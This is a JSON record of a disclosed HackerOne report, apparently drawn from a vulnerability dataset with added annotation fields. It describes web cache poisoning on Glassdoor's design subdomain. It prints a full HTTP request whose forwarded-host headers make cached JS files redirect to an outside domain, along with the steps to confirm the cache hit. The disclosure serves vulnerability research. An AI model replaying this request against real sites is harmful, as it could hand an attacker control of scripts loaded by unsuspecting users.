{
    "reported_to": "Glassdoor",
    "reported_by": "youstin ",
    "title": "Cache Poisoning allows redirection on JS files",
    "content": "\nHi,\nI found the following Cache Poisoning vulnerability:\nSend the following request: ( this will poison /test.js into redirecting to https://youst.in/test.js)\nCode 564 Bytes\n1GET /test.js?cb=1 HTTP/2\n2Host: design.glassdoor.com\n3Sec-Ch-Ua: \"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\n6Sec-Ch-Ua-Platform: \"macOS\"\n7Accept: text/css,*/*;q=0.1\n8Sec-Fetch-Site: same-origin\n9Sec-Fetch-Mode: no-cors\n10Sec-Fetch-Dest: style\n11Referer: https://design.glassdoor.com/\n12Accept-Encoding: gzip, deflate\n13Accept-Language: en-US,en;q=0.9\n14X-Forwarded-Scheme:  http\n15X-Forwarded-Host: youst.in\n16\nYou should notice the Cf-Cache-Status: MISS header when first sending the request. After sending another request, you should see Cf-Cache-Status: HIT, confirming the redirect has been cached.\nYou can also visit the url in a browser and notice you get redirect to youst.in.\nImpact\nAn attacker can use the same attack against valid JS files leading to full control over the loaded JS. If any Glassdoor websites import javascript files from https://design.glassdoor.com/* they are susceptible to a Stored XSS attack via Cache Poisoning.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Stored"
    ],
    "screenshots": {},
    "disclosed_date": 1692901560,
    "report_url": "https://hackerone.com/reports/1795197",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Send a request to /test.js?cb=1 with specific headers including 'X-Forwarded-Host: youst.in' to poison the cache."
        ],
        [
            2,
            "Verify the cache poisoning by checking the 'Cf-Cache-Status: HIT' header in subsequent requests and observing the redirection to 'youst.in'."
        ]
    ],
    "vuln_description": "The vulnerability is a cache poisoning issue that allows an attacker to redirect requests for JavaScript files to a malicious domain. By manipulating cache keys and headers, the attacker can cause the server to cache a malicious response, leading to potential stored XSS attacks if the poisoned JS files are imported by other Glassdoor websites.",
    "reason": "The attack involves understanding cache mechanisms and header manipulation, but the steps are straightforward once the cache poisoning vector is identified. The interaction between the headers and the cache is not overly complex, and the logic is similar to other cache poisoning vulnerabilities.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The cache poisoning vulnerability involves manipulating HTTP headers (X-Forwarded-Scheme, X-Forwarded-Host) to poison the cache and redirect JS files. This is not directly related to authentication or authorization bypass, nor does it involve swapping user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, which are not applicable here.",
        "is_detectable": false
    }
}